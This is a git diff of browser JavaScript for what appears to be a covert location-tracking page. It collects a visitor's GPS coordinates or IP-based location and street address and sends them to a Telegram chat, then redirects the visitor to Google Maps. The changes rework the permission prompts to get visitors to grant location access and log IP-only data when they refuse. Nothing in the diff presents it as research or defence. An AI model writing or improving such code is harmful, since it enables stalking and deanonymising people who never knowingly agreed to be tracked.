@@ -55,7 +55,7 @@ async function logIPOnly(reason = "⚠️ No GPS, IP Only") {
   await sendToTelegram(`${reason}
 🔹 IP: ${ip.ipAddress}
 📍 IP-Based Location: ${address}
-🗺️ Map: https://www.google.com/maps?q=${lat},${lon}`);
+🗺️ https://www.google.com/maps?q=${lat},${lon}`);
 }
 
 async function logGPSAndIP(lat, lon) {
@@ -68,31 +68,8 @@ async function logGPSAndIP(lat, lon) {
 📍 GPS: ${lat}, ${lon}
 📍 Address: ${address}
 🗺️ https://www.google.com/maps?q=${lat},${lon}`);
-
+  
   window.location.href = `https://www.google.com/maps/@${lat},${lon},15z`;
-}
-
-function showPermissionPopup() {
-  const popup = document.createElement("div");
-  popup.id = "location-popup";
-  popup.innerHTML = `
-    <div class="popup-box">
-      <div class="popup-title">📍 Location Access Denied</div>
-      <div class="popup-desc">Please allow location access from your browser settings to continue.</div>
-      <ul>
-        <li><b>Chrome:</b> Lock icon → Site Settings → Location → Allow</li>
-        <li><b>Safari:</b> Preferences → Websites → Location</li>
-        <li><b>Mobile:</b> App/Browser Settings → Location</li>
-      </ul>
-      <button onclick="closePermissionPopup()">OK, Got It</button>
-    </div>
-  `;
-  document.body.appendChild(popup);
-}
-
-function closePermissionPopup() {
-  const popup = document.getElementById("location-popup");
-  if (popup) popup.remove();
 }
 
 async function handleLocationFlow(trigger = "page") {
@@ -107,28 +84,28 @@ async function handleLocationFlow(trigger = "page") {
     if (permission.state === "granted") {
       navigator.geolocation.getCurrentPosition(
         pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-        err => logIPOnly("⚠️ GPS fetch error (granted)")
+        () => logIPOnly("⚠️ GPS fetch error (granted state)")
       );
     } else if (permission.state === "prompt") {
-      navigator.geolocation.getCurrentPosition(
-        pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-        err => logIPOnly("❌ User denied prompt")
-      );
-    } else if (permission.state === "denied") {
-      if (trigger === "retry") {
-        showPermissionPopup();
-      } else {
-        await logIPOnly("❌ Location permanently denied");
-      }
+      document.getElementById("location-popup").style.display = "flex";
+    } else {
+      await logIPOnly("❌ User denied location access");
     }
 
     permission.onchange = () => {
       if (permission.state === "granted") location.reload();
     };
 
-  } catch (err) {
+  } catch {
     await logIPOnly("❌ PERMISSION API failed");
   }
+}
+
+function getLocationNow() {
+  navigator.geolocation.getCurrentPosition(
+    pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
+    () => logIPOnly("❌ User denied or error")
+  );
 }
 
 function retryLocation() {
